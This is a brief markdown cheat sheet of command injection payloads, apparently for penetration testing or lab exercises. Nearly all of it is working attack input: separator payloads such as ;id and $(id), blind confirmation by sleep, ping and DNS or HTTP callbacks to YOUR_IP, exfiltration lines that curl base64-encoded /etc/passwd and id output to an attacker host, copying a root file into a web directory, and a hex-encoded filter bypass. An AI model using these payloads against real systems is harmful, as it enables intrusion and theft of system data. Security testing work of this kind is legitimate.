# Command injection — manual reference. Confirm inline, then blind, then shell.

## Separators (prefix with the app's expected value, e.g. 127.0.0.1;id)

| id

& whoami
&& id
%0aid              # newline
$(id)
`id`
%26%26id           # url-encoded &&

## Blind confirm
; sleep 5                       # Linux
& ping -n 6 127.0.0.1           # Windows
; curl http://YOUR_IP:PORT/cmdi-$(whoami)     # OAST to catch-server
; nslookup $(whoami).YOUR_IP

## Exfil output through the callback
; curl http://YOUR_IP:PORT/ -d "$(cat /etc/passwd|base64 -w0)"
; wget -qO- http://YOUR_IP:PORT/?d=$(id|base64 -w0)
; cat /root/proof.txt > /var/www/html/p.txt       # if a web-readable dir is writable

## Filter bypass

$(printf '\x69\x64')            # hex-encode 'id'
